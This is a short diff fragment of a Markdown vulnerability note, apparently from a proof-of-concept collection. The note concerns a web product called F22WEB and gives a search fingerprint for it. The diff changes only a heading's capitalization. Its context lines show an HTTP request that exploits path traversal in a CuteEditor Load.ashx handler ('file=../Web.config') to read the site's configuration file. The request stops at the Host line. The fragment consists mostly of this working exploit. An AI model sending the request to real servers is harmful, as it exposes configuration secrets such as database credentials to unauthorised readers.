@@ -8,7 +8,7 @@ body="F22WEB登陆"
 
 ![](https://cdn.nlark.com/yuque/0/2024/png/29512878/1730457537214-4b469bb6-9e58-4a78-a265-a4af3a533914.png)
 
-## poc
+## POC
 ```java
 GET /CuteSoft_Client/CuteEditor/Load.ashx?type=image&file=../Web.config HTTP/1.1
 Host: 
